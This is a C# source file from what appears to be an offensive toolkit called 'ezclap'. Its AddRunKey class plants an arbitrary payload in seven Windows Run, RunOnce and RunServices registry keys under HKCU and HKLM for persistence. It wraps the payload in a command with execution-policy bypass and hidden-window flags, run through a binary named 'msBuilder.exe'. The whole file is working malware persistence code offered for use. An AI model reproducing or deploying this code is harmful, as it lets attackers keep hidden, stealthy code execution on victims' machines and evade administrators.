using System;


/*  Name: AddRunKey 
 *  Description: Adds the payload in various RunKey registry location. 
 *  The RunKeys themselves are hardcoded in RegistryKeys.cs, as there are only 7 known 
 *  RunKey locations that can be used for persistence. 
 *  
 *  Params:
 *      - string[] name = Name of the registry key to be added into RunKey locations 
 *      - string payload = Payload string to be executed
 */
namespace ezclap
{
	public class AddRunKey
	{
		public AddRunKey (string[] names, string payload)
		{
            Initialize(names, payload);
		}
		public static void Initialize(string[] names, string payload)
		{
            if (names.Length != 7)
            {
                Console.WriteLine("[-] AddRunKey requires 7 registry key names.");
                return;
            }
            /*
             *  Description: Add RunKey registry key with payload  
             */

            payload = "msBuilder.exe -ep bypass -nop -windowstyle hidden -c " + payload;

            Utils.setHKCUSubKey(RegistryKeys.RunKey, names[0], payload);
            Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[1], payload);

            Utils.setHKLMSubKey(RegistryKeys.RunKey, names[2], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunOnceKey, names[3], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunServices, names[4], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[5], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[6], payload);
            
        }
	}
}
